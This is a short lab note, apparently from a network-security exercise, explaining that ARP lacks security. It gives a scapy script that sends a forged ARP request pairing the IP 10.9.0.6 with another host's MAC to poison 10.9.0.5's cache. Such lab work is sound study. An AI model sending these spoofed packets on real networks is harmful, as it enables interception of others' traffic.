# ARP Spoofing Attack
The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as the MAC address, given an IP address. The ARP protocol is a very simple protocol, and it does not implement any security measure.

## ARP Request
```
# Nigel ARP Request Script 
#!/usr/bin/env python3 
from scapy.all import * 

 # Create Ethernet and ARP objects 
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69') 
arp = ARP(op=1, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='02:42:0a:09:00:05', psrc='10.9.0.6') 

 # Send the packet 
sendp(ethernet/arp) 
```
